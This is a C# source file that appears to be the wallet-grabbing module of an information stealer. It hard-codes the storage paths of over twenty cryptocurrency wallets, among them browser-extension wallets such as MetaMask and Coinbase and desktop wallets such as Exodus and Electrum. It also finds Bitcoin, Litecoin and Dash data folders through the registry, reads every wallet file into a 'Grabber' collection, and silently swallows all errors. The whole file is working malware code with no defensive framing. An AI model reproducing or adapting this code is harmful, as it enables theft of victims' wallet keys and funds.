using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

namespace hostik;

internal class CW
{
	public class CryptoWallets_Collect
	{
		public static List<GrabberFileInfo> files = new List<GrabberFileInfo>();
	}

	private static readonly List<string[]> sWalletsDirectories = new List<string[]>
	{
		new string[2]
		{
			"Tronlink",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"
		},
		new string[2]
		{
			"NiftyWallet",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"
		},
		new string[2]
		{
			"MetaMask",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
		},
		new string[2]
		{
			"MathWallet",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"
		},
		new string[2]
		{
			"Coinbase",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"
		},
		new string[2]
		{
			"BinanceChain",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"
		},
		new string[2]
		{
			"BraveWallet",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl"
		},
		new string[2]
		{
			"GuardaWallet",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"
		},
		new string[2]
		{
			"EqualWallet",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"
		},
		new string[2]
		{
			"BitAppWallet",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"
		},
		new string[2]
		{
			"iWallet",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"
		},
		new string[2]
		{
			"Wombat",
			Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"
		},
		new string[2]
		{
			"Zcash",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Zcash"
		},
		new string[2]
		{
			"Armory",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Armory"
		},
		new string[2]
		{
			"Bytecoin",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin"
		},
		new string[2]
		{
			"Jaxx",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"
		},
		new string[2]
		{
			"Exodus",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet"
		},
		new string[2]
		{
			"Ethereum",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore"
		},
		new string[2]
		{
			"Electrum",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets"
		},
		new string[2]
		{
			"AtomicWallet",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic\\Local Storage\\leveldb"
		},
		new string[2]
		{
			"Guarda",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Guarda\\Local Storage\\leveldb"
		},
		new string[2]
		{
			"Coinomi",
			Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Coinomi\\Coinomi\\wallets"
		}
	};

	private static readonly string[] sWalletsRegistry = new string[3] { "Litecoin", "Dash", "Bitcoin" };

	public static void GetWallets()
	{
		try
		{
			foreach (string[] sWalletsDirectory in sWalletsDirectories)
			{
				CopyWalletFromDirectoryTo(sWalletsDirectory[1], sWalletsDirectory[0]);
			}
			string[] array = sWalletsRegistry;
			for (int i = 0; i < array.Length; i++)
			{
				CopyWalletFromRegistry(array[i]);
			}
		}
		catch
		{
		}
	}

	private static void CopyWalletFromDirectoryTo(string sWalletDir, string sWalletName)
	{
		if (!Directory.Exists(sWalletDir))
		{
			return;
		}
		try
		{
			FileInfo[] files = new DirectoryInfo(sWalletDir).GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				byte[] array = File.ReadAllBytes(fileInfo.FullName);
				CryptoWallets_Collect.files.Add(new GrabberFileInfo
				{
					File = array,
					name = "CryptoWallets\\" + sWalletName + "\\" + fileInfo.Name,
					Length = array.Length
				});
			}
		}
		catch
		{
		}
	}

	private static void CopyWalletFromRegistry(string sWalletRegistry)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software")!.OpenSubKey(sWalletRegistry)!.OpenSubKey(sWalletRegistry + "-Qt");
			if (registryKey == null)
			{
				return;
			}
			string path = registryKey.GetValue("strDataDir")!.ToString() + "\\wallets";
			if (Directory.Exists(path))
			{
				FileInfo[] files = new DirectoryInfo(path).GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					byte[] file = File.ReadAllBytes(fileInfo.FullName);
					CryptoWallets_Collect.files.Add(new GrabberFileInfo
					{
						File = file,
						name = "CryptoWallets\\WalletForRegyster\\" + fileInfo.Name
					});
				}
			}
		}
		catch
		{
		}
	}
}
